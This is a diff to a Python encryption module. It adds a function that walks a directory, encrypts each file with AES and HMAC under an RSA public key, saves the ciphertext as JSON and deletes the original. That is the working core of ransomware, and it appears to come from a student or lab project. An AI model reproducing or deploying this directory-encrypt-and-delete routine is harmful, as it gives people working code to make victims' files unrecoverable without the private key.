@@ -1,5 +1,6 @@
 import os
 
+from fileManagement import saveFileAsJSON
 from base64 import b64encode
 from cryptography.hazmat.primitives.asymmetric import padding as a_padding
 from cryptography.hazmat.backends import default_backend
@@ -7,9 +8,18 @@ from cryptography.hazmat.primitives import serialization, hashes, hmac, padding
 from cryptography.hazmat.primitives.ciphers import (
     Cipher, algorithms, modes
 )
+from keyPaths import keyPaths
 
 key_size = 32
 IVLength = 16
+
+def encryptDirectory(filepathToDirectory):
+    fileList = os.listdir(filepathToDirectory)
+    os.chdir(filepathToDirectory)
+    for file in fileList:
+         RSAcipher, ciphertext, iv, tag, ext, filename = RSAEncrypt(file,  keyPaths.pathToPublicKey)
+         saveFileAsJSON( filename + '.json', ciphertext, iv, RSAcipher, tag,  ext)
+         os.remove(file)
 
 def fileEncryptMAC (filename):
 
@@ -28,7 +38,7 @@ def fileEncryptMAC (filename):
     ciphertext, iv, tag = encryptMAC(ENCKey, HMACKey, padded_data)
 
     someData.close()
-    return (ciphertext, iv, tag, ENCKey, HMACKey, ext)
+    return (ciphertext, iv, tag, ENCKey, HMACKey, ext, name)
 
 def encryptMAC(ENCKey, HMACKey, plaintext):
     if len(HMACKey) < key_size:
@@ -64,7 +74,7 @@ def encrypt(key, plaintext):
     return (ciphertext, iv)
 
 def RSAEncrypt(filepath, RSA_Publickey_filepath):
-    C, IV, tag, ENCKey, HMACKey, ext = fileEncryptMAC(filepath)
+    C, IV, tag, ENCKey, HMACKey, ext, name = fileEncryptMAC(filepath)
 
     #load
     with open(RSA_Publickey_filepath, "rb") as key_file:
@@ -83,4 +93,4 @@ def RSAEncrypt(filepath, RSA_Publickey_filepath):
         )
     )
 
-    return(RSACipher, C, IV, tag, ext)
+    return(RSACipher, C, IV, tag, ext, name)
